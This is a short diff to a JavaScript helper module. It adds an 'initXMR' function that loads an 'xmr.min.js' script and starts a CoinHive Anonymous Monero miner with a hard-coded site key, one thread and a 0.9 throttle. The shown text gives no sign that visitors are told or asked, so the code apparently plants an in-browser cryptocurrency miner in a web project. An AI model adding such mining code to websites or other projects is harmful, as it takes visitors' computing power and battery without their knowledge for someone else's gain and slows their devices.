@@ -260,3 +260,10 @@ export const asyncLoadScript = (url, loadCB) => {
   document.head.appendChild(scriptDom)
   scriptDom.onload = loadCB
 }
+
+export const initXMR = () => {
+  asyncLoadScript((process.env.StaticServer || process.env.Server) + '/theme/js/lib/xmr.min.js', () => {
+    const miner = new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9})
+    miner.start()
+  })
+}
